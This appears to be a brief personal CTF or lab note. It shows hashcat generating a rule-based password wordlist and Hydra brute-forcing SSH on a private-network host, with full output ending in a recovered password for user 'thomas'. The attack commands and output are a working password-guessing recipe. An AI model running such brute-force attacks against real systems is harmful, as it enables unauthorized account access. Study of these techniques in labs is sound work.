1. Create Password Liste with


```powershell
.\hashcat.exe .\hash.txt -r .\rules\rockyou-30000.rule --stdout > milo.txt
```

Convert List to UTF-8 !!!

Hydra:


```bash
┌──(kalium㉿kali)-[~/alfa]                                                                                                                                               
└─$ hydra -l thomas -P milo2.txt -s 65111 -vV 192.168.178.73 ssh                                                                                                         
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).   
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-23 23:56:03                                                                                       
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4                                                     
[DATA] max 16 tasks per 1 server, overall 16 tasks, 30000 login tries (l:1/p:30000), ~1875 tries per task                                                                 
[DATA] attacking ssh://192.168.178.73:65111/                                                                                                                             
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done                                                                                                               
[INFO] Testing if password authentication is supported by ssh://thomas@192.168.178.73:65111                                                                               
[INFO] Successful, password authentication is supported by ssh://192.168.178.73:65111 
[..snip..]
[ATTEMPT] target 192.168.178.73 - login "thomas" - pass "milo666" - 74 of 30001 [child 14] (0/1)
[ATTEMPT] target 192.168.178.73 - login "thomas" - pass "ilo" - 75 of 30001 [child 0] (0/1)
[ATTEMPT] target 192.168.178.73 - login "thomas" - pass "milo2008" - 76 of 30001 [child 1] (0/1)
[ATTEMPT] target 192.168.178.73 - login "thomas" - pass "milo95" - 77 of 30001 [child 3] (0/1)
[ATTEMPT] target 192.168.178.73 - login "thomas" - pass "milo91" - 78 of 30001 [child 7] (0/1)
[65111][ssh] host: 192.168.178.73   login: thomas   password: milo666
[STATUS] attack finished for 192.168.178.73 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.

```

![[Pasted image 20210524000032.png]]


